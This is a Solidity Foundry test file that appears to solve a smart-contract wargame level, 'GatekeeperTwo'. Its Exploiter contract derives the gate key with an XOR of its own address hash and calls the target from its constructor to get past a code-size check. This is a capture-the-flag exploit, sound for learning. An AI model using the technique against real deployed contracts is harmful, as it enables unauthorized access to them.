pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "forge-std/console2.sol";

import "src/15.sol";

contract Exploiter {

    constructor(GatekeeperTwo target) {
        uint64 contractUint = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));

        uint64 max = type(uint64).max;

        uint64 responseUint = max ^ contractUint;
        bytes8 responseBytes = bytes8(abi.encodePacked(responseUint));

        bool success = target.enter(responseBytes);
        require(success, "Error");
    }
}

/*
    When executing this test case,
    use the parameter --sender 0x0000000000000000000000000000000000000001
*/

contract Test15 is Test {

    GatekeeperTwo instance;
    address user = address(0x1);

    function setUp() public {
        instance = new GatekeeperTwo();
    }

    function testSolve() public {
        address entrant = instance.entrant();
        console.log("Entrant before execution: ", entrant);

        new Exploiter(instance);
        console.log("");

        entrant = instance.entrant();

        console.log("Entrant after execution: ", entrant);

        assertEq(entrant, user);
        
    }

}